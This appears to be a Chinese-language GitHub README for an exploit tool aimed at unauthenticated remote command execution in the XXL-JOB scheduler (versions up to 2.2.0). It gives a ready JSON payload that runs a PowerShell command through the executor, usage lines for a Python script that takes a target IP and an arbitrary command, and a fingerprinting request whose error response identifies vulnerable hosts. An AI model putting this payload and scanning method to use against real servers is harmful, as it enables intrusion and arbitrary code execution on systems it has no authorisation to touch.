# xxl-job-rce

XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。
在xxl-job<= 2.2.0版本存在未授权命令执行

## payload:
```
{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_POWERSHELL",
  "glueSource": "calc",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```
##工具使用截图
###用法:
python3 xxl-job-rce.py [IP Address] -p [Prot(default 9999)] -c [Command] -m[Ccript Method(default powershell)]'
python3 xxl-job-poc.py 192.168.229.146 -c calc
python3 xxl-job-poc.py 192.168.229.146 -c calc -m shell -p 9999

![image](https://github.com/mrknow001/xxl-job-rce/blob/main/xxl-job-powershell.png)
![image](https://github.com/mrknow001/xxl-job-rce/blob/main/xxl-job-python.png)


## 根据异常报错指纹-快速发现目标机器

```
POST /run HTTP/1.1
Host: 127.0.0.1:9999
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```
```
HTTP/1.1 200 OK
content-type: text/html;charset=UTF-8
content-length: 646

{
  "code": 500,
  "msg": "request error:java.lang.NullPointerException
	at com.xxl.job.core.biz.impl.ExecutorBizImpl.run(ExecutorBizImpl.java:49)
	at com.xxl.job.core.server.EmbedServer$EmbedHttpServerHandler.process(EmbedServer.java:201)
	at com.xxl.job.core.server.EmbedServer$EmbedHttpServerHandler.access$200(EmbedServer.java:138)
	at com.xxl.job.core.server.EmbedServer$EmbedHttpServerHandler$1.run(EmbedServer.java:166)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
	at java.lang.Thread.run(Thread.java:745)
"
}
```
